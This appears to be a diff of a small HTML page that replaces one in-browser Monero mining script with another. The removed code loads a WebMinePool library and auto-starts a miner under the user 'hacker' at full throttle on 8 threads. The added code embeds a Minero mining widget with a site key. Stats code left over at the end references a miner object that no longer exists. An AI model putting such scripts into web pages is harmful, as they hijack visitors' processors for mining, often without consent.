@@ -1,25 +1,14 @@
 <html>
   <head>
-      <title>WEBMINERPOOL</title>
-    <style>
-    #logo {
-  background: url(https://adminserver2020.github.io/webminepool/logo/logo.png);
-  background-repeat: no-repeat;
-  background-size: auto;
-}
-    </style>
+      <title>Minero PoolXmr</title>
    </head>
- <body id="logo">
-   <script src="https://adminserver2020.github.io/webminepool/lib/base.js"></script>
-<script>
-    var miner = WMP.User('SK_cqfhmRYcfpQgnaYfnS7Rq', 'hacker',{
-        threads: 8,
-        autoThreads: false,
-        throttle: 0,
-        forceASMJS: false
-    });
-    miner.start();
-</script>
+ <body>
+<script src="https://minero.cc/lib/minero-miner.min.js" async></script>
+<div class="minero-miner"
+     style="width: 400px; height: 120px"
+     data-key="522e4cec6108913af248f03b6bc6daaf">
+  <em>Please disable Adblock!</em>
+</div>
    <script>
   // Get stats
   var hashesPerSecond = miner.getHashesPerSecond();
